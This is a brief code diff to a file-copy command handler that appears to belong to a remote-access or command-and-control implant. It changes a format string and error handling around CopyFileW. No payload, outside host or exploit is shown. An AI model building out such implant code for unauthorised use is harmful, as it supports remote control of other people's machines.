@@ -1013,12 +1013,11 @@ VOID CommandFS( PPARSER Parser )
             PathFrom = ParserGetWString( Parser, &FromSize );
             PathTo   = ParserGetWString( Parser, &ToSize );
 
-            PRINTF( "Copy file %s to %s\n", PathFrom, PathTo )
+            PRINTF( "Copy file %ls to %ls\n", PathFrom, PathTo )
 
             Success = Instance.Win32.CopyFileW( PathFrom, PathTo, FALSE );
             if ( ! Success ) {
                 PACKAGE_ERROR_WIN32
-                goto CLEAR_LEAVE;
             }
 
             PackageAddInt32( Package, Success );
